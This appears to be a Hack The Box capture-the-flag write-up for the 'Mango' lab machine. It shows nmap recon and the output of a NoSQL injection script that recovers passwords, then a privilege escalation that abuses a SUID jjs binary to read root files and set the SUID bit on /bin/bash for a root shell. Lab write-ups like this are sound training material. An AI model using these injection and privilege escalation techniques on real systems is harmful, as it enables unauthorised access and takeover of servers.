---
tags:
title: Mango - Medium (HTB)
permalink: /Mango-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80,443 10.129.229.185
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 18:59 -0300
Nmap scan report for mango.htb (10.129.229.185)
Host is up (0.62s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
Service Info: Host: 10.129.229.185; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.67 seconds
```

## Website

![image-center](/assets/images/Pasted image 20260106185909.png)

## Website SSL

![image-center](/assets/images/Pasted image 20260106185958.png)

![image-center](/assets/images/Pasted image 20260106190415.png)

![image-center](/assets/images/Pasted image 20260106190700.png)

![image-center](/assets/images/Pasted image 20260106190644.png)

```bash
python3 no.py
[*] Starting NoSQL Injection Attack
[*] Target: https://staging-order.mango.htb/


[*] Attacking user: admin
[+] Testing: admin -> t9KcS3>!0B#2
[✓] Found password for admin: t9KcS3>!0B#2                 
[+] admin:t9KcS3>!0B#2


[*] Attacking user: mango
[+] Testing: mango -> h3mXK8RhU~f{]f5H
[✓] Final password for mango: h3mXK8RhU~f{]f5H
[+] mango:h3mXK8RhU~f
```


```bash
ssh mango@mango.htb
mango@mango.htb's password: 
<SNIP>
mango@mango:~$
```

```bash
mango@mango:~$ su admin
Password: 
$ whoami
admin
admin@mango:/home/admin$ cat user.txt 
50b22cd7faa0eafb62cfd4b986cad4f7
```

```bash
admin@mango:/home/admin$ find / -perm -4000 2>/dev/null  | grep -v "snap"
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
```

```bash
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/.ssh/id_rsa"));
java.lang.RuntimeException: java.io.FileNotFoundException: /root/.ssh/id_rsa (No such file or directory)
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
11477178f71e222f8fc6ed205f9857d3
```

```bash
admin@mango:/home/mango$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
0
jjs> 
[5]+  Stopped                 jjs
admin@mango:/home/mango$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

```bash
admin@mango:/home/mango$ bash -p 
bash-4.4# cd /root/
bash-4.4# ls
root.txt
bash-4.4# cat us
cat: us: No such file or directory
bash-4.4# cat root.txt 
11477178f71e222f8fc6ed205f9857d3
```

`~Happy Hacking.`